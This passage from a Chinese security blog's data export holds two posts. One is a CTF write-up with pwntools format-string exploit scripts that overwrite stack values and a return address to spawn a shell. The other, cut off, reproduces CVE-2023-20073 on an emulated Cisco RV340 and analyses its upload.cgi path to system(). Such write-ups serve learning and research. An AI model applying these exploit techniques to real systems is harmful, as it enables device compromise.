class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;,&quot;-l&quot;,&quot;66%&quot;]</span></span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;b *0x401332&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1 leak stack</span></span><br><span class=\"line\">payload=<span class=\"string\">b&quot;%8$p&quot;</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">rbp=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)-<span class=\"number\">0x20</span></span><br><span class=\"line\"><span class=\"comment\">#logv(&quot;rbp&quot;,hex(rbp))</span></span><br><span class=\"line\">rbp_low=rbp &amp; <span class=\"number\">0xffff</span></span><br><span class=\"line\">fmt_low=<span class=\"number\">0x4040c0</span> &amp; <span class=\"number\">0xffff</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#2 gouzao </span></span><br><span class=\"line\">payload =  <span class=\"string\">b&quot;%p&quot;</span> * <span class=\"number\">4</span> </span><br><span class=\"line\">payload += <span class=\"string\">&#x27;%&#123;&#125;c%hn&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">0x20</span>-<span class=\"number\">0x4</span>-<span class=\"number\">40</span>).encode()</span><br><span class=\"line\">payload+= <span class=\"string\">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class=\"built_in\">format</span>((<span class=\"number\">0x6873</span>-(rbp_low+<span class=\"number\">0x20</span>)+<span class=\"number\">0xe</span>)).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 3 </span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;%p&quot;</span> *<span class=\"number\">4</span> </span><br><span class=\"line\">payload+= <span class=\"string\">&#x27;%&#123;&#125;c%hn&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">0x12</span>-<span class=\"number\">40</span>).encode()</span><br><span class=\"line\">payload+= <span class=\"string\">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class=\"built_in\">format</span>((<span class=\"number\">0x1274</span>-(rbp_low+<span class=\"number\">0x38</span>)+<span class=\"number\">0x30</span>+<span class=\"number\">0x10000</span>)%<span class=\"number\">0x10000</span>).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","excerpt":"","more":"<h1 id=\"fmt\"><a href=\"#fmt\" class=\"headerlink\" title=\"fmt\"></a>fmt</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>一个平常的下午，学妹让我帮忙看看题。起初我不以为意，吃完晚饭才开始看。然后就写到了1点钟。感觉自己的思路还是太丑陋，不优雅。于是想起了一个格式化字符串的极限利用。<br><a href=\"https://zikh26.github.io/posts/a523e26a.html#%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4\">一次有趣的格式化字符串漏洞利用 | ZIKH26’s Blog</a><br>开始研究</p>\n<h2 id=\"ida分析\"><a href=\"#ida分析\" class=\"headerlink\" title=\"ida分析\"></a>ida分析</h2><h3 id=\"main函数\"><a href=\"#main函数\" class=\"headerlink\" title=\"main函数\"></a>main函数</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810223742657.png\" alt=\"image-20250810223742657\"></p>\n<p>功能非常的简单，</p>\n<ol>\n<li>循环3次调用talk，需要控制flag的值（后续再看）</li>\n<li>atk判断，成功则调用he()</li>\n</ol>\n<p>先看he()里有啥。</p>\n<h3 id=\"he函数\"><a href=\"#he函数\" class=\"headerlink\" title=\"he函数\"></a>he函数</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810224024236.png\" alt=\"image-20250810224024236\"></p>\n<p>这里建议看汇编，</p>\n<ol>\n<li>system的出现，让人思路开朗</li>\n<li>command是<code>-0xe</code>，也就是要控制<code>rbp-0xe</code></li>\n<li>注意lea 和 mov 的区别，通过这个方法的话，必须要把”&#x2F;bin&#x2F;sh”写在栈上</li>\n</ol>\n<p>一般揣测一下出题人的想法，肯定是最后要返回到这里了。</p>\n<h3 id=\"talk函数\"><a href=\"#talk函数\" class=\"headerlink\" title=\"talk函数\"></a>talk函数</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810224845139.png\" alt=\"image-20250810224845139\"></p>\n<p>重点来了，</p>\n<ol>\n<li>非栈上格式化字符串,每次只读0x20字节</li>\n<li>flag初始是0,talk会把它变成1,想办法置0</li>\n<li>返回到了my_read,继续追踪</li>\n</ol>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810225109891.png\" alt=\"image-20250810225109891\"></p>\n<p>看看bss段上,这些变量的位置</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810225315432.png\" alt=\"image-20250810225315432\"></p>\n<p>atk在flag上面,那么就可以利用my_read把flag设置成0 ,只要每次都输入8字节就可以.</p>\n<h2 id=\"思路分析\"><a href=\"#思路分析\" class=\"headerlink\" title=\"思路分析\"></a>思路分析</h2><p>1.通过格式化字符串去修改command,和返回地址.让程序最后跳转执行,getshell<br>2.但是，常规的思路，需要的格式化次数不止3次。</p>\n<blockquote>\n<ol>\n<li>%p泄露栈地址</li>\n<li>把rbp链入（因为此题目栈上无<code>诸葛连弩</code>，要自己建）</li>\n<li>修改啥也不行，没次数了</li>\n</ol>\n</blockquote>\n<p>3.所以笔者在这里用了一些奇怪的方法。</p>\n<blockquote>\n<ol>\n<li>笔者开始想，因为<code>i</code>也是在栈上的，所以我可以修改<code>i</code>来增加次数</li>\n<li>但是，恰因如此，如果修改rbp，那么会影响下次循环对<code>i</code>的判断，</li>\n<li>于是笔者又注意到栈上有很多0，控制好rbp，其实也是可以的 。</li>\n<li>所以在笔者的精心的构造下，完成了10次格式化字符串的修改。</li>\n<li>比较重要的就是两个$n的运用。一个把<code>sh</code>写在了栈上,一个把最后修改返回地址前的,rbp-0x4 修改好了.</li>\n</ol>\n</blockquote>\n<p>4.笔者又再反思,可不可以利用格式化字符串的极限,两次把所需的改完.答案是可以.</p>\n<h2 id=\"exp\"><a href=\"#exp\" class=\"headerlink\" title=\"exp\"></a>exp</h2><h3 id=\"10次格式化字符串\"><a href=\"#10次格式化字符串\" class=\"headerlink\" title=\"10次格式化字符串\"></a>10次格式化字符串</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;,&quot;-l&quot;,&quot;66%&quot;]</span></span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1 leak stack</span></span><br><span class=\"line\">payload=<span class=\"string\">b&quot;%8$p&quot;</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">rbp=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)-<span class=\"number\">0x20</span></span><br><span class=\"line\"><span class=\"comment\">#logv(&quot;rbp&quot;,hex(rbp))</span></span><br><span class=\"line\">rbp_low=rbp &amp; <span class=\"number\">0xffff</span></span><br><span class=\"line\">fmt_low=<span class=\"number\">0x4040c0</span> &amp; <span class=\"number\">0xffff</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#2，3 rbp链入,修改rbp </span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%6$hn&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%47$hn\\x00&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">0x38</span>).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\">#4,5,6 &#x27;sh&#x27;写入栈,修改rbp,把rbp+0x3e-4 链入并置0</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%8$n\\x00&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"number\">0x6873</span>).encode() <span class=\"comment\"># 1 canshuxieshangl</span></span><br><span class=\"line\"></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">0x58</span>).encode()</span><br><span class=\"line\">payload+= <span class=\"string\">&#x27;%&#123;&#125;c%6$hn\\x00&#x27;</span>.<span class=\"built_in\">format</span>((<span class=\"number\">0x38</span>+<span class=\"number\">0xe</span>-<span class=\"number\">4</span>-<span class=\"number\">0x58</span>+<span class=\"number\">0x10000</span>)%<span class=\"number\">0x10000</span>).encode() <span class=\"comment\"># 0</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"number\">5</span>)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%47$n\\x00&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"number\">0x00</span>).<span class=\"built_in\">format</span>() <span class=\"comment\"># 1</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">######7 把rbp再次链入</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%6$hn\\x00&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\">#####8 修改rbp 为rbp_low+0x38+0xe</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%47$hn\\x00&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">0x38</span>+<span class=\"number\">0xe</span>).encode()</span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x20</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;b *0x401332&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">##### 9 把rbp+8 链入</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%6$hn\\x00&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">8</span>).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"><span class=\"comment\">##### 10 修改返回地址</span></span><br><span class=\"line\">payload = <span class=\"string\">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class=\"built_in\">format</span>(<span class=\"number\">0x1274</span>).encode()</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(payload))</span><br><span class=\"line\">payload +=<span class=\"string\">b&#x27;/bin/sh\\x00&#x27;</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"优雅至极\"><a href=\"#优雅至极\" class=\"headerlink\" title=\"优雅至极\"></a>优雅至极</h3><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> esy <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level=<span class=\"string\">&quot;debug&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal=[&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;,&quot;-l&quot;,&quot;66%&quot;]</span></span><br><span class=\"line\">io,elf=loadfile(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">gdb.attach(io,<span class=\"string\">&quot;b *0x401332&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1 leak stack</span></span><br><span class=\"line\">payload=<span class=\"string\">b&quot;%8$p&quot;</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">rbp=<span class=\"built_in\">int</span>(io.recv(<span class=\"number\">14</span>),<span class=\"number\">16</span>)-<span class=\"number\">0x20</span></span><br><span class=\"line\"><span class=\"comment\">#logv(&quot;rbp&quot;,hex(rbp))</span></span><br><span class=\"line\">rbp_low=rbp &amp; <span class=\"number\">0xffff</span></span><br><span class=\"line\">fmt_low=<span class=\"number\">0x4040c0</span> &amp; <span class=\"number\">0xffff</span></span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#2 gouzao </span></span><br><span class=\"line\">payload =  <span class=\"string\">b&quot;%p&quot;</span> * <span class=\"number\">4</span> </span><br><span class=\"line\">payload += <span class=\"string\">&#x27;%&#123;&#125;c%hn&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">0x20</span>-<span class=\"number\">0x4</span>-<span class=\"number\">40</span>).encode()</span><br><span class=\"line\">payload+= <span class=\"string\">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class=\"built_in\">format</span>((<span class=\"number\">0x6873</span>-(rbp_low+<span class=\"number\">0x20</span>)+<span class=\"number\">0xe</span>)).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 3 </span></span><br><span class=\"line\">payload = <span class=\"string\">b&quot;%p&quot;</span> *<span class=\"number\">4</span> </span><br><span class=\"line\">payload+= <span class=\"string\">&#x27;%&#123;&#125;c%hn&#x27;</span>.<span class=\"built_in\">format</span>(rbp_low+<span class=\"number\">0x12</span>-<span class=\"number\">40</span>).encode()</span><br><span class=\"line\">payload+= <span class=\"string\">&#x27;%&#123;&#125;c%47$hn&#x27;</span>.<span class=\"built_in\">format</span>((<span class=\"number\">0x1274</span>-(rbp_low+<span class=\"number\">0x38</span>)+<span class=\"number\">0x30</span>+<span class=\"number\">0x10000</span>)%<span class=\"number\">0x10000</span>).encode()</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;...\\n&quot;</span>,payload)</span><br><span class=\"line\">io.sendafter(<span class=\"string\">&quot;battle!&quot;</span>,<span class=\"string\">b&quot;a&quot;</span>*<span class=\"number\">8</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.interactive()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n"},{"title":"CVE-2023-20073复现","cover":"/img/治不开心药.png","_content":"# CVE-2023-20073\n\n## 前言\n\n​    开始学习iot的漏洞挖掘，第一次复现cve漏洞\n[[原创]从零开始复现 CVE-2023-20073-智能设备-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-278240.htm)\n\n## 固件获取\n\n[Software Download - Cisco Systems](https://software.cisco.com/download/home/286287791/type/282465789/release/1.0.03.29)\n\n从官网获取RV340 的固件\n\n![固件下载](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724184650280.png)\n\n## binwalk 解压\n\nbinwalk -Me xxx.img\n\n![binwalk解压](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724184805292.png)\n\n解压成功\n\n![解压](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724190444842.png)\n\n但是和文章一样出现了warnning\n\n\n\n![warning](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724190638436.png)\n\n配置起来有点麻烦，因为binwalk 现在很难搞，~~所以我决定直接手动修改这个链接\n\n```\nln -sf /tmp var\n```\n\n事实证明这样做是不行的，后续仿真时会失败。可能是因为还有其他的软连接被破坏了，所以只能去修改binwalk 的文件内容。因为我是用apt-get install 安装的binwalk ，所以我只能通过找到已经安装的binwalk 的文件位置来修改。\n![binwalk](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250725173240219.png)\n\n我这里是1008行，把这里修改为if 0 and not \n\n![修改](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250725173349943.png)\n\n问题解决\n\n![结果](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724201653555.png)\n\n## qume 与 主机连接\n\n先下载后面的 东西，在运行这个脚本\n\n```shell\n#!/bin/bash\n\n# 使用 iproute2 替代 brctl\nPHY_IFACE=\"ens33\"\nBRIDGE=\"br0\"    \nTAP_IFACE=\"tap0\"\n\n# 创建网桥\nsudo ip link add name $BRIDGE type bridge\nsudo ip link set $BRIDGE up\n\n# 配置物理接口\nsudo ip link set $PHY_IFACE promisc on\nsudo ip link set $PHY_IFACE master $BRIDGE\n\n# 创建 TAP 设备\nsudo ip tuntap add mode tap user root name $TAP_IFACE\nsudo ip link set $TAP_IFACE promisc on\nsudo ip link set $TAP_IFACE master $BRIDGE\nsudo ip link set $TAP_IFACE up\n\n# 获取 DHCP\nsudo dhclient -v $BRIDGE\n\n# 验证配置\necho -e \"\\n=== 网络配置验证 ===\"\nbridge link show $BRIDGE\nip addr show $BRIDGE\n```\n\n\n\n## busybox\n\n在解压出来的文件系统下，查看busybox的信息\n\n![busybox](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724202303901.png)\n\n下载需要的文件\n\n```\nwget https://people.debian.org/~aurel32/qemu/armhf/debian_wheezy_armhf_standard.qcow2\nwget https://people.debian.org/~aurel32/qemu/armhf/vmlinuz-3.2.0-4-vexpress\nwget https://people.debian.org/~aurel32/qemu/armhf/initrd.img-3.2.0-4-vexpress\n```\n\n## 启动qemu\n\n先执行\n\nqemu-img resize debian_wheezy_armhf_standard.qcow2 32G\n\n### boot.sh\n\n```shell\nsudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress \\\n  -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 \\\n  -append \"root=/dev/mmcblk0p2\" -net nic -net tap,ifname=tap0,script=no,downscript=no \\\n  -nographic -smp 4\n```\n\n然后sudo ./boot.sh\n\n![启动](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250725121644660.png)\n\n用户密码都是root\n\n往虚拟机中传刚才的文件，先打包在传送\n\ntar -czvf rootfs.tar.gz rootfs\n\nsudo scp -r rootfs.tar.gz root@192.168.225.134:/root/rootfs.tar.gz\n\ntar -xzvf rootfs.tar.gz\n\n## 仿真隔离\n\n```shell\nchmod -R 777 rootfs\ncd rootfs/\nmount --bind /proc proc\nmount --bind /dev dev\nchroot . /bin/sh\n```\n\n## 启动Nginx\n\n```\n/etc/init.d/boot boot\ngenerate_default_cert\n/etc/init.d/confd start\n/etc/init.d/nginx start\n```\n\n## 访问\n\n\n\n![网页](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250725171041446.png)\n\n## 漏洞分析\n\n### rest.url.conf\n\n![rest.url.conf](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801133734167.png)\n`upload_pass` ,后台会用/form-file-upload 继续处理\n`upload_store`,文件会上传到/tmp/upload\n`upload_store_access`,设置了文件的权限\n`upload_set_form_field xxx` 设置了文件的相关字段，文件名、文件类型、文件路径、md5值、文件大小\n\n### web.upload.conf\n\n![web.upload.conf](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801163029477.png)\n这里通过uwsgi_pass,将请求转发，最后会执行 `upload.cgi`\n\n### upload.cgi\n#### sub_115EC\n\n![sub_115ec](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801163641641.png)\n这里最终会执行system函数，而sprintf中的三个参数都是可以控制的，只要我们把s_1设置为刚才上传的文件路径，_tmp_firmware控制为/tmp/www(要把s1控制为Portal) , s_2控制位login.html就可以篡改登录界面\n\n#### main\n\n![main](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801164510313.png)\n\n根据上面的分析，也就是v17要控制为Portal，V16要控制为刚上传的文件路径，v18要是login.html\n\n![main](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250801164909962.png)\n\nv17对应v30，v16对应v29，v18对应v31","source":"_posts/Iot/CVE-2023-20073.md","raw":"---\ntitle: CVE-2023-20073复现\ntags: \n  - 漏洞复现\n  - iot\ncategories: \n  - iot\ncover: /img/治不开心药.png\n---\n# CVE-2023-20073\n\n## 前言\n\n​    开始学习iot的漏洞挖掘，第一次复现cve漏洞\n[[原创]从零开始复现 CVE-2023-20073-智能设备-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-278240.htm)\n\n## 固件获取\n\n[Software Download - Cisco Systems](https://software.cisco.com/download/home/286287791/type/282465789/release/1.0.03.29)\n\n从官网获取RV340 的固件\n\n![固件下载](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724184650280.png)\n\n## binwalk 解压\n\nbinwalk -Me xxx.img\n\n![binwalk解压](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724184805292.png)\n\n解压成功\n\n![解压](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724190444842.png)\n\n但是和文章一样出现了warnning\n\n\n\n![warning](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724190638436.png)\n\n配置起来有点麻烦，因为binwalk 现在很难搞，~~所以我决定直接手动修改这个链接\n\n```\nln -sf /tmp var\n```\n\n事实证明这样做是不行的，后续仿真时会失败。可能是因为还有其他的软连接被破坏了，所以只能去修改binwalk 的文件内容。因为我是用apt-get install 安装的binwalk ，所以我只能通过找到已经安装的binwalk 的文件位置来修改。\n![binwalk](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250725173240219.png)\n\n我这里是1008行，把这里修改为if 0 and not \n\n![修改](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250725173349943.png)\n\n问题解决\n\n![结果](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250724201653555.png)\n\n## qume 与 主机连接\n\n先下载后面的 东西，在运行这个脚本\n\n```shell\n#!/bin/bash\n\n# 使用 iproute2 替代 brctl\nPHY_IFACE=\"ens33\"\nBRIDGE=\"br0\"    \nTAP_IFACE=\"tap0\"\n\n# 创建网桥\nsudo ip link add name $BRIDGE type bridge\nsudo ip link set $BRIDGE up\n\n# 配置物理接口\nsudo ip link set $PHY_IFACE promisc on\nsudo ip link set $PHY_IFACE master $BRIDGE\n\n# 创建 TAP 设备\nsudo ip tuntap add mode tap user root name $TAP_IFACE\nsudo ip link set $TAP_IFACE promisc on\nsudo ip link set $TAP_IFACE master $BRIDGE\nsudo ip link set $TAP_IFACE up\n\n# 获取 DHCP\nsudo dhclient -v $BRIDGE\n\n# 验证配置\necho -e \"\\n=== 网络配置验证 ===\"\nbridge link show $BRIDGE\nip addr show $BRIDGE\n```\n\n\n\n## 